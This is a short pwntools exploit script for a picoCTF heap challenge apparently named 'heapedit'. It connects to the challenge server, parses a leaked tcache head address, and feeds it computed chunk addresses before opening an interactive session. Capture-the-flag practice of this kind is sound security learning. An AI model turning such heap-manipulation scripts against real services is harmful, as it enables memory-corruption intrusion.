from pwn import *

context.arch = "amd64"
r = remote("candy-mountain.picoctf.net" ,49548)

# r = process("/mnt/c/Users/PC/Downloads/heapedit")
# gdb.attach(r)

offset = 144

r.recvuntil(b"tcache head (start of free list) -> ")
head = int(r.recvline().strip() , 16)
print("[*] head => " , head)

for i in range(1 , 7):
    print("[*] number :" , i)
    r.recvuntil(b"Chunk " + str(i).encode() + b" address: ")
    r.sendline(hex(head+(i-1)*144).encode())

r.interactive()
